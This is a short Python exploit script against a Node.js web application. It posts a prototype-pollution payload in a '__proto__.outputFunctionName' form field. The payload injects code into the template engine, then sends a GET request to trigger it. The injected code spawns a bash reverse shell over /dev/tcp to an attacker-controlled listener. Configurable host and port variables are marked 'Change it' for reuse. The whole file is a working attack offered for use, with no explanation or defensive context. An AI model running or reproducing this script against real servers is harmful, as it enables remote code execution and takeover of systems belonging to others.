import requests
LHOST='10.0.0.12'  # Change it
LPORT='5555'    # Change it
RHOST='127.0.0.1'   # Change it
RPORT='8080'    # Change it
cmd = 'bash -c "bash -i &> /dev/tcp/'+LHOST+'/'+LPORT+' 0>&1"'
# pollute
requests.post('http://'+RHOST+':'+RPORT, files = {'__proto__.outputFunctionName': (
    None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})

# execute command
requests.get('http://'+RHOST+':'+RPORT)